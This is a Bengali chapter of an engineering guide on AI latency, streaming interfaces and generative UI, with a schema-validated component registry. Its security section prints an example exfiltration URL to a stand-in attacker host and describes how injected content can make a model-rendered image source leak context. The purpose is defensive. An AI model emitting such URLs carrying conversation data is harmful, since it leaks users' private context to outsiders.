---
sourceHash: "552f3b23c85361bd997d92ab03fd91051cbfa883af4a0d3f300954639252ff89"
title: "Latency ও Generative UI"
translatedAt: "2026-10-19T08:02:01.874Z"
model: "claude-opus-5-5 (Claude Code)"
---

# Latency ও Generative UI {#ch-generative-ui}

> কয়েক সেকেন্ডের উত্তরকেও তৎপর মনে হওয়ার মতো করুন। তারপর model-কে একটি নির্দিষ্ট allow-list থেকে আপনার component বাছতে দিন, কোনো ফাঁক না খুলে।

**এই অধ্যায়ে:** প্রথম token আসতে সময় · user অপেক্ষা করার সময় কী দেখাবেন · লম্বা সময়ের কাজ · component registry · model-এর বাছা props-এর security boundary

## 💡 মূল ধারণা

AI feature-এর সৎ ন্যূনতম সময় হলো **প্রথম token পর্যন্ত কয়েকশো millisecond, আর পুরো উত্তর পর্যন্ত কয়েক সেকেন্ড**।
Model একটি একটি করে token বানায়, তাই কোনো engineering দিয়েই এই অপেক্ষা সরানো যায় না। দ্রুত করতে পারবেন না, তাই
তৎপর মনে হওয়ার মতো করুন। শুরুতেই অগ্রগতি দেখান, সেটা চলতে দিন, user-কে পড়ার মতো কিছু দিন।

উত্তর আসার পর দেখা যায়, গদ্য প্রায়ই ভুল আকার। গত quarter-এর আয় নিয়ে প্রশ্ন করলে দরকার একটি chart, একটি table আর
একটি link। **Generative UI-তে component বাছে model, কিন্তু কোন কোন component আছে আর সেগুলো কী পেতে পারে, তা ঠিক করে
আপনার code।** Model একটি branch বেছে নেয়। Code লেখে না।

> ধীর উত্তর user ক্ষমা করেন। কিছুই না দেখানো interface ক্ষমা করেন না।

## কীভাবে কাজ করে

### Latency budget

| ধাপ | সাধারণত | কমানো যায়? |
| --- | --- | --- |
| আপনার server পর্যন্ত network | 20–80 ms | সামান্য |
| Retrieval | 50–400 ms | হ্যাঁ — index, *k*, reranking |
| Prompt জোড়া লাগানো | 1–20 ms | খুব কমই লাভ হয় |
| **প্রথম token আসতে সময়** | 200 ms – 2 s | হ্যাঁ — ছোট model, ছোট prompt, caching |
| Token তৈরি | 20–150 tokens/s | শুধু কম তৈরি করে |

**User যে সংখ্যাটা টের পান, সেটা প্রথম token আসতে সময়।** যে উত্তর 400 ms-এ শুরু হয়ে আট সেকেন্ডে শেষ হয়, সেটা চার
সেকেন্ডে শুরু হয়ে পাঁচ সেকেন্ডে শেষ হওয়া উত্তরের চেয়ে ভালো লাগে। Retrieval আর reranking পুরোটাই প্রথম token-এর আগে
বসে। Documentation assistant-এ 400 ms-এর একটি reranker চোখে দেখা যাওয়ার মতো প্রতিটি byte-কে দেরি করিয়ে দেয়। Prompt
কত লম্বা, তার ওপরও প্রথম token-এর সময় নির্ভর করে। বিশটি নয়, পাঁচটি ভালো chunk পাঠানোর এটা আরও একটি কারণ।

Page-এর একটি INP লক্ষ্য তবু থাকে (input পেলে কত দ্রুত সাড়া দেয়), আর যে pane প্রতিটি token-এ re-render হয়, সেটা
সেই লক্ষ্যে পৌঁছাতে পারবে না। দেখুন [Chapter ?? — Core Web Vitals](#ch-core-web-vitals)।

### অপেক্ষার সময়টা কী দিয়ে ভরাবেন

| সময় | কী দেখাবেন | কেন |
| --- | --- | --- |
| 300 ms-এর কম | কিছুই না | এক ঝলক spinner না থাকার চেয়েও খারাপ |
| 300 ms – 1 s | হালকা একটি indicator | Input পাওয়া গেছে, এটুকু জানান |
| 1–3 s | ধাপের নাম: "docs-এ খুঁজছি" | এমন অগ্রগতি, যার একটি মানে আছে |
| 3–10 s | Stream হওয়া content | উত্তরটাই progress bar |
| 10 s-এর বেশি | ধাপে ধাপে অগ্রগতি, একটি cancel button | User-এর হাতে নিয়ন্ত্রণ দরকার |

Team-রা তৃতীয় row-টা বাদ দেয়। **ধাপের নাম তথ্য, সাজসজ্জা নয়।** "Docs-এ খুঁজছি" দেখে বোঝা যায় system প্রশ্নটা কীভাবে
পড়েছে। তাই ভুল বোঝা হলে user আট সেকেন্ড পরে নয়, এখনই থামাতে পারেন।

Streaming একটি লম্বা অপেক্ষাকে বদলে দেয় তাড়াতাড়ি শুরুতে, তারপর মানুষ যত দ্রুত পড়ে তার চেয়ে দ্রুত text আসতে থাকে।
Transport-এর কথা আছে [Chapter ?? — Streaming Response](#ch-streaming-responses)-এ। Interface-এর নিয়মগুলো এই:

- **প্রতিটি token আসার সঙ্গে সঙ্গে render করুন।** বাক্য শেষ হওয়া পর্যন্ত buffer করলে যে অপেক্ষা সরাতে খরচ করেছেন,
  সেটাই ফিরে আসে।
- **Layout স্থির রাখুন।** জায়গাটা আগে থেকে রেখে দিন, যাতে প্রতিটি chunk-এ container reflow না হয়।
- **User-কে ছাড়িয়ে কখনো নিজে থেকে scroll করবেন না।** নিচে আটকে রাখুন শুধু তখনই, যখন user আগে থেকেই নিচে আছেন।
- **প্রথম token থেকেই cancel control দেখান।** সময় আর খরচের ওপর user-এর একমাত্র নিয়ন্ত্রণ এটাই।

### উত্তর আসার আগের কাজ

Input-এ focus এলেই retrieval prefetch করা, keystroke-এ connection warm করে রাখা, আর user-এর message সঙ্গে সঙ্গে
দেখিয়ে দেওয়া, এগুলো প্রায় বিনা খরচে হয়। সম্ভাব্য প্রশ্ন আন্দাজ করে আগেই model call করা তা নয়। ব্যবহার না হওয়া
call মানে অকারণে টাকা খরচ, আর বড় পরিসরে এই নষ্ট call দ্রুত জমে যায়।

> ⚠️ এখানে optimistic UI-র ভূমিকা কম। Request শুরু হয়েছে, সেটা সঙ্গে সঙ্গে দেখাতে পারেন। কিন্তু উত্তরটা আগে দেখাতে
> পারবেন না, কারণ সেটা আপনি জানেন না। যে interface user-এর হয়ে আন্দাজ করে, সেটা "কাজ চলছে" স্বীকার করা interface-এর
> চেয়ে খারাপ।

### লম্বা সময়ের কাজ

দশ সেকেন্ড পেরোলে chat window আর ঠিক আকার নয়। কয়েক মিনিটের agent run-এর দরকার background job-এর সরঞ্জাম: চোখে
দেখা যায় এমন plan, ধাপের অগ্রগতি, এমন cancel যেটা সত্যিই থামায়, আর এমন result যেটা page ছেড়ে গেলেও থেকে যায়।
আগে plan দেখান। ভুল বোঝা কাজ বারো নম্বর ধাপে নয়, এক নম্বর ধাপেই থামাতে পারলে সময় আর টাকা দুটিই বাঁচে।

### Component registry

**Registry আর renderer — নামটা দিয়ে খোঁজা হয়, props validate হয়**

```tsx
const registry = {
  chart: {
    schema: z.object({
      kind: z.enum(['line', 'bar']),
      series: z.array(z.object({ label: z.string().max(40), value: z.number() })).max(50),
    }),
    Component: Chart,
  },
  citation: {
    schema: z.object({ chunkId: z.string() }),   // an id, not a URL — see below
    Component: Citation,
  },
} as const;

function render(name: string, props: unknown) {
  const entry = registry[name as keyof typeof registry];
  if (!entry) return <Fallback />;                       // unknown name: render nothing special
  const parsed = entry.schema.safeParse(props);
  if (!parsed.success) return <Fallback />;              // bad props: never partially render
  return <entry.Component {...parsed.data} />;
}
```

তিনটি জিনিস এটাকে নিরাপদ রাখে। **অচেনা নাম এলে fallback render হয়**, model-এর বানানো কিছু কখনো নয়। **Render-এর
আগে props যাচাই হয়**, তাই কোনো field না থাকলে ভাঙা component নয়, fallback আসে। **সীমা থাকে schema-তে**, যেমন 50টি
point আর 40টি character। খোলা array দিলে model মাঝে মাঝে বিশাল একটি array বানিয়ে ফেলে।

Model block বের করে [Chapter ?? — Structured Output](#ch-structured-output) দিয়ে। Discriminated union বেশিরভাগ ভুল
নাম decoding-এর ধাপেই আটকে দেয়, fallback দরকার হওয়ার আগেই।

**Output schema — model শুধু সেই component-গুলোর নাম বলতে পারে, যেগুলো আছে**

```typescript
const UiBlock = z.discriminatedUnion('component', [
  z.object({ component: z.literal('chart'), props: registry.chart.schema }),
  z.object({ component: z.literal('citation'), props: registry.citation.schema }),
]);
```

### Security boundary

প্রতিটি prop এমন একটি value, যেটা model বানিয়েছে, আর তার কিছুটা এসেছে এমন document থেকে যেটা আপনার নিয়ন্ত্রণে নেই।
Props-কে attack-এর জায়গা হিসেবে ধরুন।

| Prop-এর ধরন | ঝুঁকি | নিয়ম |
| --- | --- | --- |
| Text | Injected নির্দেশ তথ্য হিসেবে দেখানো | Text হিসেবে render করুন, কখনো HTML হিসেবে নয় |
| URL (`href`, `src`) | Data পাচারের পথ, phishing-এর লক্ষ্য | Origin allow-list করুন, বা একটি id পাঠিয়ে server-এ resolve করুন |
| Markdown | Script, image, যেকোনো link | Tag আর attribute-এর কড়া allow-list |
| একটি id | নিরাপদ | User যা দেখার অনুমতি পান, তার সঙ্গে মিলিয়ে server-এ resolve করুন |
| কাঁচা HTML | Cross-site scripting | কখনো নয় |

সবচেয়ে গুরুত্বপূর্ণ URL-এর row, যেমনটা [Chapter ?? — Prompt Injection](#ch-prompt-injection) ব্যাখ্যা করে। Model-এর
নিয়ন্ত্রণে থাকা image source বাইরে যাওয়ার একটি পথ: `https://attacker.example/x.png?d=<context>` render হওয়ার
সঙ্গে সঙ্গেই data ফাঁস করে, কোনো click ছাড়াই। শুধু render করার একটি সিদ্ধান্ত lethal trifecta-র তৃতীয় পা জুড়ে দিয়েছে।

**Id পাঠান, server-এ resolve করুন।** Documentation assistant-এ citation-এর সঙ্গে থাকে একটি chunk id। Server সেটাকে link
বানায় শুধু তখনই, যদি ওই chunk এই user-এর জন্য retrieve করা হয়ে থাকে।

> ⚠️ Image চালু রেখে model-এর output Markdown হিসেবে render করলে, image source সীমিত না করা পর্যন্ত সেটা data পাচারের
> পথ। Generative UI-তে সবচেয়ে বেশি চোখ এড়িয়ে যাওয়া ফাঁক এটাই।

### অসম্পূর্ণ component stream করা

Object আসে field ধরে ধরে, তাই props সম্পূর্ণ হওয়ার আগেই component render হতে পারে। Schema validate না হওয়া পর্যন্ত
একটি skeleton দেখান। পঞ্চাশটি point-এর মধ্যে তিনটি নিয়ে আঁকা chart ধাপে ধাপে আসা নয়, সেটা ভুল। ধাপে ধাপে render
text-এর জন্য ঠিক আছে, কিন্তু user যা সংখ্যা হিসেবে পড়েন তার জন্য নয়। অসম্পূর্ণ props-এ কখনো side effect চালাবেন না,
কারণ অসম্পূর্ণ object কোনো সিদ্ধান্ত নয়।

## কখন ব্যবহার করবেন

| Feature | Design |
| --- | --- |
| Chat বা documentation assistant | Stream, ধাপের নাম, cancel; text আর citation block |
| নানা রকম প্রশ্নের data assistant | Chart, table আর text block-সহ একটি registry |
| অল্প কয়েকটি জানা আকারের উত্তর | একটি classifier কয়েকটি template থেকে একটি বাছে — কোনো generation নেই |
| যা কিছু লেখে বা টাকা খরচ করে | Template, সঙ্গে স্পষ্ট confirmation-এর ধাপ |
| কয়েক মিনিটের agent run | Background job-এর UI: plan, অগ্রগতি, cancel, টিকে থাকা result |

"Generative UI" চাওয়া বেশিরভাগ request-এর কাজ মিটে যায় একটি classifier দিয়ে, যেটা পাঁচটি layout-এর একটি বাছে।
এটা দ্রুত, সস্তা, test করা যায়, আর security-র নতুন কোনো জায়গা খোলে না। বানানোর আগে মেপে দেখুন generation আদৌ
দরকার কি না।

## সাধারণ ভুল

**❌ আট সেকেন্ডের অপেক্ষায় একটি spinner**

> এটা কিছুই বলে না, আর সময় আরও ধীর মনে হয়। Stream করুন, নইলে অন্তত ধাপের নাম বলুন।

**✅ ধাপের নাম বলুন, আর প্রথম token থেকেই stream করুন**

> "Docs-এ খুঁজছি" একই সঙ্গে অগ্রগতি আর শুধরে দেওয়ার সুযোগ। ভুল বোঝা request user তাড়াতাড়ি থামাতে পারেন।

**❌ Model-কে URL, HTML বা সীমাহীন Markdown দিতে দেওয়া**

> Model-এর নিয়ন্ত্রণে থাকা `src` বা `href` বাইরে যাওয়ার একটি পথ। কাঁচা HTML মানে নতুন রাস্তায় আসা cross-site scripting।

**✅ সীমা বাঁধা schema দিয়ে props validate করুন, id পাঠান, আর ব্যর্থ হলে fallback দেখান**

> Fallback একটি ভালো ফলাফল। Undefined props নিয়ে আধা-render হওয়া component নয়।

## 🔑 মূল শিক্ষা

- User যে latency টের পান, সেটা প্রথম token আসতে সময়, আর retrieval পুরোটাই তার আগে বসে।
- ধাপের নাম বলুন, প্রতিটি token stream করুন, layout স্থির রাখুন, আর পাঠককে ছাড়িয়ে কখনো নিজে থেকে scroll করবেন না।
- দশ সেকেন্ড পেরোলে background job-এর interface দিন: চোখে দেখা যায় এমন plan, অগ্রগতি, cancel আর টিকে থাকা result।
- Model বাছে আপনার লেখা registry থেকে, আর কিছু render হওয়ার আগে তার props সীমা বাঁধা schema পার হয়।
- Model-এর দেওয়া URL data পাচারের পথ, তাই id পাঠান আর server-এ resolve করুন।

## Interview-এর প্রশ্ন

**Q: Model-এর আট সেকেন্ড লাগে। User কী দেখবেন?**

Spinner নয়। Stream হওয়া text কয়েকশো millisecond-এর মধ্যে শুরু হওয়া উচিত। তাহলে অপেক্ষাটা হয়ে যায় তাড়াতাড়ি শুরু,
তারপর user যত দ্রুত পড়েন তার চেয়ে দ্রুত text। প্রথম token-এর আগে retrieval চলতে থাকে, তাই সেই ধাপের নাম দেখাই।
এটা যেকোনো model upgrade-এর চেয়ে দ্রুত মনে হয়, আর পরিবর্তনটা frontend-এর।

**Q: আপনি এমন একটি reranker যোগ করলেন, যেটা উত্তর ভালো করে কিন্তু 300 ms খরচ করে। এটা কি পোষায়?**

নির্ভর করে 300 ms-টা কোথায় পড়ছে, আর এখানে সেটা পুরোটাই পড়ছে প্রথম চোখে দেখা byte-এর আগে। তাই এটা বিনা খরচের
লাভ নয়। আমি চাইব retrieval eval-এ recall@5 সত্যিই বাড়ুক। ছোট corpus-এ, যেখানে উত্তর আগে থেকেই প্রথম পাঁচটির মধ্যে
আছে, সেখানে এটা নিছক latency।

**Q: Model-এর output থেকে component render করার ঝুঁকি কী, আর কীভাবে সেটা আটকে রাখেন?**

Output অবিশ্বস্ত input, এমন system থেকে আসা যেটা attacker-এর নিয়ন্ত্রণে থাকতে পারে এমন document পড়ে। তাই model
discriminated union দিয়ে শুধু আমার registry-র component-এর নামই বলতে পারে, আর প্রতিটি prop সীমা বাঁধা schema পার
হয়। অচেনা বা ভুল কিছু এলে fallback render হয়। সবচেয়ে ধারালো জায়গা হলো URL: model-এর নিয়ন্ত্রণে থাকা image source
render হলেই context ফাঁস করে, কোনো click ছাড়াই।

**Q: কখন generative UI বানাবেন না?**

যখন উত্তরের আকার অল্প কয়েকটি আর আগে থেকে জানা, আর বেশিরভাগ সময় সেটাই হয়। পাঁচটি template থেকে একটি বেছে নেওয়া
classifier সস্তা, দ্রুত, deterministic, test করা যায়, আর security-র কোনো জায়গা খোলে না। Generation-এর দিকে যাই শুধু
তখন, যখন উত্তর data অনুযায়ী এমনভাবে বদলায় যে আমি তালিকা করে বলতে পারি না। Side effect আছে এমন যেকোনো কিছু থাকে
template-এ, স্পষ্ট confirmation-সহ।

## এরপর কী পড়বেন

- [Chapter ?? — Streaming Response](#ch-streaming-responses) — যে transport থাকলে তাড়াতাড়ি token আসা সম্ভব
- [Chapter ?? — Prompt Injection](#ch-prompt-injection) — model-এর দেওয়া URL কেন security-র সিদ্ধান্ত
- [Chapter ?? — বিশ্বাস, নির্ভুলতা ও Failure State](#ch-trust-and-correctness-ux) — citation block কীসের জন্য, আর ব্যর্থ হলে interface কী করে
